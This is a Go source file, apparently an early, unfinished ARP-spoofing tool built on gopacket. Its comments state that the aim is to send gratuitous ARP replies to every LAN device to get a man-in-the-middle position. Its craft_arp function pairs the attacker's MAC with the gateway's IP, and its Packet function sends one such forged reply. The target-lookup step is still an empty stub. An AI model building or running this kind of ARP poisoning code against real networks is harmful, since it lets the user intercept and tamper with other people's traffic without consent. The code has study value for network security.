package captureArp

import (
	"log"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// TODO: make a packet sender
// NOTE: So we just need to send arp replay to all devices in the LAN inorder to get mitm
// NOTE: So there is a type of arp messages that sent to all clients called Gratuitous which \
//       is using the ethernet layer dest mac address as broadcast address (ff:ff:ff:ff:ff:ff) \
//       to send the arp message to all client. Also the target mac in the arp message is broadcast too.
var (
	buffer gopacket.SerializableLayer
	option gopacket.SerializableLayer
)

func craft_arp(attackerMac []byte, targeMac []byte, getwayIp []byte, targetIp []byte, op uint16) *layers.ARP {
	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         op,
		SourceHwAddress:   net.HardwareAddr(attackerMac), // Attacker mac
		SourceProtAddress: getwayIp[:4],
		DstHwAddress:      net.HardwareAddr(targeMac), // target
		DstProtAddress:    targetIp[:4],
	}
	return arp
}

func craft_ethernet(targetHard []byte, attackerHard []byte) *layers.Ethernet {
	ether := &layers.Ethernet{
		EthernetType: layers.EthernetTypeARP,
		SrcMAC:       net.HardwareAddr(attackerHard),
		DstMAC:       net.HardwareAddr(targetHard),
	}
	return ether;
}

// TODO
func getTargetMac(targetIp []byte){

}

func Packet(handler *pcap.Handle) {

    mac := net.HardwareAddr{0xFF, 0xAA, 0xFA, 0xAA, 0xFF, 0xAA};
	ip := []byte{192, 168, 0, 2}
    buffer := gopacket.NewSerializeBuffer();
    eth := craft_ethernet(mac,mac);
    arp := craft_arp(mac, mac, ip, ip, layers.ARPReply);
	opt := gopacket.SerializeOptions{
		FixLengths: true,
		ComputeChecksums: true,
	}
	err := gopacket.SerializeLayers(buffer, opt, eth,arp);
	if err != nil {
		log.Fatal("Error serilize the packet ", err);
	}
	err = handler.WritePacketData(buffer.Bytes());
	if err != nil {
		log.Fatal("Error serilize the packet ", err);
	}
    
	log.Printf("Everything goes as expected packet has been sent \n" );
	log.Println(ip[:4] );
}
